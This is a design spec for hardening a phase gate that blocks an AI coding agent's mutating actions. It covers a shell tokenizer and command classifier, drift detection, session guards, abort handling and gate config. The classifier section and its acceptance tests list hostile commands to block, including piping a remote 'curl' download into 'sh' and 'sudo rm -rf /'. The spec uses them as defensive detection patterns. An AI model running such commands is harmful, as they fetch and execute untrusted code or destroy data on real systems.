# Spec — 0.3.0 gate hardening

**Branch:** `feat/gate-hardening` · **Parent:** `feat/enforced-phase-machine` (`a10c5fb`)
**Status:** REVIEWED — R1–R5 applied (see REVIEW.md). Ready to implement.
**Scope:** C1–C5 from CHANGES.md, plus defect D3.

---

## Purpose

0.2.0 made phase order enforceable. It left the weakest parts of that enforcement
soft, and documented them rather than fixing them. 0.3.0 hardens them. No new
user-facing workflow; this is a quality pass on the enforcement layer.

## Non-goals

- No new phases, commands, or workflow concepts.
- No change to the store schema shape that 0.1.0 users migrated to, except the
  addition of optional fields.
- No subprocess isolation.
- No attempt to enforce anything through MCP.

---

## C1 — Shell tokenizer and command classifier

### Problem

```ts
const MUTATING_BASH = [/\bgit\s+commit\b/, /\brm\s+-[a-z]*r/, …];
```

Seven regexes over the raw command string.

**False positives.** `echo "remember to git commit"` matches. `grep -r "rm -rf"` matches.
A quoted string containing a mutating word blocks a read-only command.

**False negatives.** `sudo rm -rf /` matches only by luck of `\b`. `find . -delete`
is not in the list. `> out.txt` is not detected. `git -C /repo commit` is missed
because the regex expects `commit` immediately after `git`. And the regex is
wrong in the other direction too: `\bgit\b` matches the `git` in `/usr/bin/git
commit`, so 0.2.0 blocks commands it should allow.

### Design

Two pure functions.

```ts
export interface ShellSegment {
  argv: string[];        // tokenized, quotes removed
  raw: string;           // original text of this segment
  redirects: boolean;    // segment writes via > >> 2> | tee
}

/** Split a command line into segments on ; && || | and newlines, respecting quotes. */
export function tokenizeShell(command: string): ShellSegment[];

/** Return the effective command name, skipping env assignments and wrappers. */
export function commandName(argv: string[]): string | null;

/** Classify a segment as a mutation, or null if it does not mutate. */
export function classifySegment(seg: ShellSegment): { kind: string; why: string } | null;
```

`commandName` skips leading `KEY=value` tokens and the wrappers `sudo`, `env`,
`command`, `nohup`, `time`, `nice`, `xargs`, `doas`, then compares the **basename**
of the token, **case-sensitively**.

> **R1 applied.** Case-sensitive by design. A case-insensitive match turns
> `/bin/GIT`, `~/bin/git` and `./GIT` into `git commit` on a case-sensitive
> filesystem. Compare against `basename(token)`, never the raw path, so
> `/usr/bin/git commit` classifies as `git commit` — which is correct — while
> `GIT` does not.

`git` is special-cased: after the command name, consume leading `-x` / `--xxx`
options **and their paired values**, then take the subcommand. Otherwise
`git -c user.email=x commit` and `git --work-tree=/tmp commit` resolve to a flag
rather than to `commit`, and the mutation is missed.

> **R2 applied.** `-c` consumes the following token as its value. `--work-tree=…`
> is self-contained. A bare `--flag` followed by a non-option token is treated as
> self-contained.

`classifySegment` returns a kind:
- `vcs-mutation` — `git commit|merge|rebase|push|reset --hard`, `hg`, `svn commit`
- `destructive-fs` — `rm -r`, `find … -delete`, `dd`, `mkfs`, `shred`, `truncate`
- `redirect-write` — segment has `>`/`>>`/`tee`
- `package-install` — `npm install|i|ci|publish`, `cargo add|publish`, `go get|install`,
  `pip install`, `gem install`, `apt install`
- `remote-exec` — `curl|wget` piped to `sh|bash`, or any invocation of `sh|bash` with
  no script argument reading from a pipe

Classification is by **command name plus argument inspection**, not by substring
anywhere in the line.

### Acceptance

- `echo "git commit"` → not blocked.
- `grep -r "rm -rf" .` → not blocked.
- `sudo rm -rf /tmp/x` → blocked, kind `destructive-fs`.
- `git -C /repo commit -m x` → blocked, kind `vcs-mutation`.
- `find . -name '*.log' -delete` → blocked, kind `destructive-fs`.
- `echo hi > /tmp/out.txt` → blocked, kind `redirect-write`.
- `ls -la && git status` → not blocked.
- `curl https://x.sh | sh` → blocked, kind `remote-exec`.
- `/usr/bin/git commit -m x` → blocked (basename match).
- `/bin/GIT commit -m x` → **not** blocked (case-sensitive).
- `git -c user.email=x commit` → blocked.
- Malformed quoting never throws.

> **R4 applied — fail-open has an exception.** Parse uncertainty fails open,
> *except* where a pipe's target is a shell interpreter, which fails closed.
> `curl x | sh` is the highest-consequence mutation on the list and must not be
> missed because the tokenizer disliked the quoting.

---

## C2 — Verification reads the store; markdown drift is a finding

### Problem

`runVerification` builds its input from `readRegistry(FMT_FILE)` etc. — the
*rendered* documents. README claims "the store is the source of truth"; nothing
checks that the render matches. Hand-edited markdown parses into blocks that no
longer describe the design, or fails to parse and is reported as *missing*,
which reads as "you forgot to do this phase" rather than "your documents and
your state disagree".

### Design

Verification takes its input from `state.contracts`, `state.modules`,
`state.dependencies`, `state.adapters`, `state.primitive`.

Markdown parsing is retained for exactly one purpose: **drift detection**.

```ts
export interface DriftFinding {
  file: string;
  kind: "missing" | "stale" | "unparsable";
  detail: string;
}
export function detectDrift(state: FleetState): DriftFinding[];
```

A document is `stale` when its parsed block ids differ from the store's ids.
`unparsable` when the file exists but yields zero blocks while the store has
entries.

> **R5 applied — no timestamp comparison.** The spec originally proposed
> comparing a `*Generated by*` stamp against the store's last mutation. That has
> no second operand: `fleet-state.json` carries no `updatedAt`, and the writers
> stamp the document *before* `saveState` runs, so every document would read as
> newer and drift would never fire. Id-set comparison catches the stated failure
> and carries no ordering hazard. Adding `state.updatedAt` is deferred; it is
> not needed for 0.3.0.

Drift is reported as a **distinct finding kind**, severity `low`, and never
causes `REJECT` on its own — a stale render is a housekeeping problem, not a
design defect. It must not be conflated with `VRFY-*` results.

Cross-reference, cycle, freedom, and boundary checks continue to work unchanged,
now sourced from structured objects rather than re-parsed markdown. The
`extractFreedom` label-normalization logic is retained and re-homed onto the
structured `FormatContract`, which removes the need to handle two label styles
at all — but it is kept because store files imported from 0.1.0 may contain the
legacy shape.

### Acceptance

- Verification passes against a store with no rendered documents, reporting
  drift rather than failing.
- Hand-editing a rendered document changes the drift finding, not the verdict.
- All 0.2.0 REJECT paths (dangling ref, cycle, leaky contract) still fire.
- Drift alone never yields `REJECT`.

---

## C3 — Session guards and rewind integrity

### D3 (bug)

`advancePhase` permits rewind below Phase 9. On rewind it leaves
`state.verification` intact. `gateForPhase` accepts `summary === "PASS"` from any
previous run, so **a verdict obtained before the rewind still unblocks Phase 9** —
the gate honours a value that no longer describes reality. Same class as the
0.1.0 self-seeding defect.

### Design

**Invalidate on rewind.** `advancePhase` clears `state.verification` when the
target phase is lower than the phase at which the verdict was produced. The
stored verdict records `phase` at run time; a rewind below it clears it.

> **R3 applied.** This is **not** configurable. A flag that reopens a High
> severity defect is not a switch — it just relocates the bug into a config file
> where it looks deliberate. `invalidateVerdictOnRewind` is removed from the C5
> schema.

**Guard the session switch.** `session_before_switch` cancels when the decision
queue is non-empty and `currentPhase >= 8`. Losing unresolved decisions at
contract-freeze time is unrecoverable; losing them at Phase 2 is not. Below
Phase 8 the switch is allowed and audited.

**Fork and clone are safe** — they copy. Audited, not blocked.

**Never trap the user.** The switch guard is disabled by
`.pi/fleet-gate.json` → `sessionGuards: false`, and `/fleet:override` is not a
substitute for it: a trap with no exit is a trap.

### Acceptance

- Rewind from 7 to 3 clears the verdict.
- Re-forward to 9 without re-verifying is blocked, naming the verdict.
- Re-verifying after rewind restores a usable verdict.
- Session switch cancelled at Phase 8 with unresolved decisions; allowed at
  Phase 2; allowed at Phase 8 when `sessionGuards: false`.
- Fork never blocked.

---

## C4 — Honour the abort signal

### Problem

Tool `execute` receives an `AbortSignal`. Fleet tools ignore it. A turn aborted
between an operation's computation and its `saveState` can still persist.

### Design

Small helper, applied to the tools that write state:

```ts
function aborted(signal?: AbortSignal): boolean { return !!signal?.aborted; }
```

Tools return `{ content: [{ type: "text", text: "Aborted" }], details: { aborted: true } }`
before persisting when the signal is already aborted. Verification is cheap and
synchronous — it is exempt, and the spec says so rather than adding ceremony.

**Scope honesty:** nothing in the fleet is long-running. There are no
subprocesses, no network calls, no long loops. C4 removes a correctness hazard;
it does not make anything interruptible that is not already fast.

### Acceptance

- Every state-writing tool returns `aborted: true` and leaves the store
  unchanged when the signal is pre-aborted.
- No tool throws on an abort.

---

## C5 — Declared gate coverage

### Problem

`WRITE_TOOLS` and the mutating-command list are hardcoded in `fleet-core.ts`.
Coverage is invisible to the user and cannot be extended without editing source.

### Design

Config at **`.pi/fleet-gate.json`** — project level, committable. Explicitly *not*
under `architecture/`, which is gitignored workspace output.

```json
{
  "enabled": true,
  "writeTools": ["write", "edit", "multi_edit", "patch", "apply_patch"],
  "shellTools": ["bash", "shell"],
  "extraMutatingCommands": { "terraform": ["apply", "destroy"] },
  "sessionGuards": true
}
```

Every field has a default matching 0.2.0 behaviour, so absence of the file
changes nothing. `invalidateVerdictOnRewind` was proposed and removed — see R3.

`fleet_gate_coverage` (tool) and `/fleet:gate` (command) report what is gated,
what is not, and which MCP or non-tool write paths are outside the gate's reach.

### Acceptance

- No config file → behaviour identical to 0.2.0.
- Adding a write tool to the config extends coverage.
- `enabled: false` disables the write gate and says so in the audit log.
- `fleet_gate_coverage` names the unenforced write paths explicitly.

---

## Test plan

- **Pure-function tests** for `tokenizeShell`, `commandName`, `classifySegment`,
  `detectDrift` — no I/O, no model, no fixtures beyond inline strings.
- **Gate tests** through the `tool_call` hook, as in 0.2.0.
- **Session-guard tests** through `session_before_switch` / `session_before_fork`.
- **Regression:** all 107 existing assertions must stay green.
- Target: ≥ 150 assertions, `node test/smoke.mjs`, zero failures.

## Risks

| Risk | Mitigation |
|---|---|
| Tokenizer mis-parses shell and blocks legitimate work | Fails **open** on parse uncertainty (except pipe-to-shell, R4); quote-aware; negative tests for the seven known false positives |
| A case-insensitive or substring match blocks a lookalike binary | R1: basename compare, case-sensitive; explicit `/bin/GIT` negative test |
| Drift detection fires constantly in normal use | Writes update the document immediately after the store; severity `low`; never causes REJECT |
| Session guard traps the user | Narrow trigger (phase ≥ 8 **and** non-empty queue); `sessionGuards: false`; every block audited. **Accepted as a rough edge (R6)** — documented in README limitations, not solved |
| C2 rewrites the verification core | Store-shaped input is the same shape the writers already emit; all 0.2.0 REJECT paths are regression tests |
| Scope creep | Five changes, one branch, no new user-facing workflow |

## Rollback

Each change is independently revertible: C1 replaces one function, C2 changes
one input source, C3 adds two hooks plus four lines in `advancePhase`, C4 adds
guards to tools, C5 adds a config read with 0.2.0 defaults. No schema migration,
so reverting any subset leaves a coherent store.